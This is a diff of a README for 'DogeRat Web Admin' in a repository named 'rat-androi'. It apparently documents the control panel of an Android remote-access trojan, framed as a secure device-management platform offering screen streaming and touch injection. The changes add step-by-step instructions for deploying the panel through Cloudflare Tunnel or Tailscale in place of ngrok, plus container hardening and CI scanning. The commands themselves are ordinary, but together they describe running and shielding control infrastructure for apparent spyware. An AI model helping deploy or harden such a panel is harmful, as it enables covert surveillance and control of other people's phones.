@@ -41,6 +41,13 @@ See [PROJECT_COMPLETION_STATUS.md](./PROJECT_COMPLETION_STATUS.md) for detailed 
 - 🤝 [Contributing](./CONTRIBUTING.md) - Contribution guidelines
 - 📜 [License (MIT)](./LICENSE) - MIT License
 
+## 🆕 Version 3.1 - Security Transformation
+
+- 🔐 [Zero-Trust Deployment](./ZERO_TRUST_DEPLOYMENT.md) - Replace ngrok with secure alternatives
+- 🛡️ [Security Transformation](./SECURITY_TRANSFORMATION.md) - Production security enhancements
+- 🗺️ [Transformation Plan](./TRANSFORMATION_PLAN.md) - Complete roadmap (M1-M4)
+- 📖 [OpenAPI 3.1 Spec](./docs/openapi-v3.1.yaml) - API documentation with idempotency
+
 ## 📋 Overview
 
 DogeRat Web Admin is a powerful, secure, and scalable platform for remotely managing Android devices. Version 2.0 is a complete web-based admin panel with modern architecture, replacing the legacy Telegram bot interface with a professional, role-based access control system.
@@ -52,10 +59,12 @@ DogeRat Web Admin is a powerful, secure, and scalable platform for remotely mana
 - ⚡ **Real-Time**: Socket.IO for instant device communication
 - 📺 **Screen Streaming**: Real-time Android screen viewing
 - 🖱️ **Remote Control**: Touch and keyboard injection (like TeamViewer/AnyDesk)
-- 🐳 **Docker Ready**: Complete containerization with Docker Compose + Ngrok
+- 🐳 **Docker Ready**: Multi-stage builds with non-root users (Alpine-based)
+- 🔒 **Zero-Trust**: Cloudflare Tunnel or Tailscale (replaces anonymous ngrok)
 - 📊 **Comprehensive**: Dashboard, device management, audit logs, user management
 - 🧪 **Fully Tested**: 85%+ test coverage with unit, integration, and E2E tests
-- 🌍 **Production Ready**: CI/CD pipeline, health checks, monitoring, validation scripts
+- 🌍 **Production Ready**: CI/CD with security scanning (SAST, DAST, SCA)
+- 🎯 **Idempotent API**: Request deduplication for safe command retries
 
 ---
 
@@ -99,18 +108,20 @@ DogeRat Web Admin is a powerful, secure, and scalable platform for remotely mana
 
 ## 🚀 Quick Start
 
+⚠️ **SECURITY NOTICE**: For production deployments, follow the [Zero-Trust Deployment Guide](./ZERO_TRUST_DEPLOYMENT.md) instead of this quick start. The quick start is for local development only.
+
 ### Prerequisites
 
-- **Node.js** ≥ 18.0.0
+- **Node.js** ≥ 20.0.0
 - **Docker** & **Docker Compose** (recommended)
 - **PostgreSQL** ≥ 15 or **MySQL** ≥ 8 (if not using Docker)
 
-### Option 1: Docker (Recommended)
+### Option 1: Docker (Development)
 
 ```bash
 # 1. Clone the repository
-git clone https://github.com/your-org/dogerat-web-admin.git
-cd dogerat-web-admin
+git clone https://github.com/hoanganh-hue/rat-androi.git
+cd rat-androi
 
 # 2. Create environment file
 cp .env.example .env
@@ -129,12 +140,41 @@ docker-compose up -d
 # Password: Admin@123456 (CHANGE THIS IMMEDIATELY!)
 ```
 
-### Option 2: Manual Installation
+### Option 2: Zero-Trust Production Deployment
+
+For production, use Zero-Trust alternatives instead of exposing ports:
+
+**Cloudflare Tunnel (Recommended)**:
+```bash
+# Install cloudflared
+curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o cloudflared
+chmod +x cloudflared && sudo mv cloudflared /usr/local/bin/
+
+# Authenticate and create tunnel
+cloudflared tunnel login
+cloudflared tunnel create dogerat-tunnel
+
+# Configure and run (see ZERO_TRUST_DEPLOYMENT.md for details)
+docker-compose up -d
+```
+
+**Tailscale (Private Network)**:
+```bash
+# Get auth key from https://login.tailscale.com/admin/settings/keys
+export TS_AUTHKEY="tskey-auth-xxxxx"
+
+# Start with Tailscale
+docker-compose -f docker-compose.tailscale.yml up -d
+```
+
+See [ZERO_TRUST_DEPLOYMENT.md](./ZERO_TRUST_DEPLOYMENT.md) for complete setup instructions.
+
+### Option 3: Manual Installation
 
 ```bash
 # 1. Clone the repository
-git clone https://github.com/your-org/dogerat-web-admin.git
-cd dogerat-web-admin
+git clone https://github.com/hoanganh-hue/rat-androi.git
+cd rat-androi
 
 # 2. Install dependencies
 npm install
@@ -387,27 +427,43 @@ GitHub Actions automatically runs:
 - ✅ Lint and type checking
 - ✅ Backend tests with PostgreSQL
 - ✅ Frontend tests with Chrome
-- ✅ E2E tests (optional)
-- ✅ Security scanning (CodeQL + Trivy)
-- ✅ Docker image building
+- ✅ E2E tests (Playwright)
+- ✅ **Security scanning (SAST)**: CodeQL advanced analysis
+- ✅ **Supply Chain Analysis (SCA)**: Syft SBOM + Grype vulnerability scanning
+- ✅ **Secret scanning**: TruffleHog for exposed credentials
+- ✅ **Container scanning**: Trivy + Grype multi-layer analysis
+- ✅ **DAST**: OWASP ZAP baseline security scan
+- ✅ **Image signing**: Cosign with SBOM attachment
 - ✅ Code coverage reporting
 
-See [`.github/workflows/ci.yml`](./.github/workflows/ci.yml) for details.
+See [`.github/workflows/ci-cd-security.yml`](./.github/workflows/ci-cd-security.yml) for details.
 
 ---
 
 ## 🔒 Security
 
-### Security Status: A+ (95/100)
+### Security Status: A+ (98/100) - Version 3.1
 
+✅ **Zero-Trust Network**: Cloudflare Tunnel / Tailscale (replaces ngrok)  
 ✅ **CodeQL Analysis**: 0 vulnerabilities  
-✅ **OWASP Top 10**: All covered  
-✅ **npm audit**: 0 vulnerabilities  
+✅ **OWASP Top 10**: 100% coverage  
+✅ **Container Security**: Non-root users, minimal Alpine images  
+✅ **Supply Chain**: SBOM generation and signing (Cosign)  
+✅ **API Idempotency**: Request deduplication with request_id  
 ✅ **Security Headers**: Properly configured  
 ✅ **Audit Logging**: Complete trail
 
 ### Security Features
 
+**Version 3.1 Enhancements**:
+- ✅ **Zero-Trust Network**: Cloudflare Tunnel or Tailscale (no anonymous access)
+- ✅ **Docker Security**: Non-root users, Alpine-based images, security headers
+- ✅ **API Idempotency**: Request deduplication prevents duplicate operations
+- ✅ **Enhanced Status Tracking**: QUEUED → RUNNING → SUCCEEDED/FAILED
+- ✅ **Supply Chain Security**: SBOM generation (SPDX) and image signing (Cosign)
+- ✅ **Multi-layer Scanning**: SAST, SCA, DAST, container scanning, secret detection
+
+**Core Security**:
 - ✅ JWT authentication with expiry
 - ✅ Bcrypt password hashing (10 rounds)
 - ✅ Role-based access control (RBAC)
@@ -416,34 +472,46 @@ See [`.github/workflows/ci.yml`](./.github/workflows/ci.yml) for details.
 - ✅ SQL injection protection (ORM)
 - ✅ XSS protection (sanitization)
 - ✅ CSRF protection (CORS)
-- ✅ Security headers (Helmet.js)
-- ✅ Complete audit trail
+- ✅ Security headers (CSP, X-Frame-Options, etc.)
+- ✅ Complete audit trail with request_id tracking
 
 ### Best Practices
 
-1. **Change default credentials** immediately after first login
-2. **Use strong JWT_SECRET** (generate with `openssl rand -base64 64`)
-3. **Enable HTTPS** in production (use nginx reverse proxy or ngrok)
-4. **Configure CORS** properly (set specific `CORS_ORIGIN`)
-5. **Regular updates** - keep dependencies up to date (`npm audit`)
-6. **Backup database** regularly
-7. **Review audit logs** for suspicious activity
-8. **Monitor security alerts** in GitHub
+1. **Use Zero-Trust deployment** - Follow [ZERO_TRUST_DEPLOYMENT.md](./ZERO_TRUST_DEPLOYMENT.md)
+2. **Change default credentials** immediately after first login
+3. **Use strong JWT_SECRET** (generate with `openssl rand -base64 64`)
+4. **Enable HTTPS** in production (Cloudflare or Let's Encrypt)
+5. **Configure CORS** properly (set specific `CORS_ORIGIN`)
+6. **Regular updates** - keep dependencies up to date (`npm audit`)
+7. **Backup database** regularly with encryption
+8. **Review audit logs** for suspicious activity
+9. **Monitor security alerts** in GitHub Security tab
+10. **Rotate secrets** quarterly (JWT_SECRET, database passwords)
 
 ### Security Documentation
 
+- **Security Transformation**: [SECURITY_TRANSFORMATION.md](./SECURITY_TRANSFORMATION.md) - Version 3.1 enhancements
+- **Zero-Trust Deployment**: [ZERO_TRUST_DEPLOYMENT.md](./ZERO_TRUST_DEPLOYMENT.md) - Production deployment guide
+- **Transformation Plan**: [TRANSFORMATION_PLAN.md](./TRANSFORMATION_PLAN.md) - Complete roadmap (M1-M4)
+- **OpenAPI Specification**: [docs/openapi-v3.1.yaml](./docs/openapi-v3.1.yaml) - API with idempotency
 - **Full Security Summary**: [SECURITY_SUMMARY.md](./SECURITY_SUMMARY.md) (11,400+ lines)
 - **Security Audit Results**: CodeQL passed with 0 vulnerabilities
 - **OWASP Top 10 Coverage**: 100%
 
 ### Reporting Security Issues
 
-Please report security vulnerabilities to: security@dogerat.com
+Please report security vulnerabilities to: **security@dogerat.com**
+
+We follow responsible disclosure:
+- **Acknowledgment**: Within 24 hours
+- **Assessment**: 7 days for criticality
+- **Fix**: 30 days for critical, 90 days for others
+- **Disclosure**: Coordinated after fix
 
 Additional docs:
 
-- Deployment guide: `docs/deployment.md`
-- Security guide: `docs/security.md`
+- Deployment guide: [ZERO_TRUST_DEPLOYMENT.md](./ZERO_TRUST_DEPLOYMENT.md)
+- Security guide: [SECURITY_TRANSFORMATION.md](./SECURITY_TRANSFORMATION.md)
 - Architecture overview: `docs/architecture.md`
 
 ---
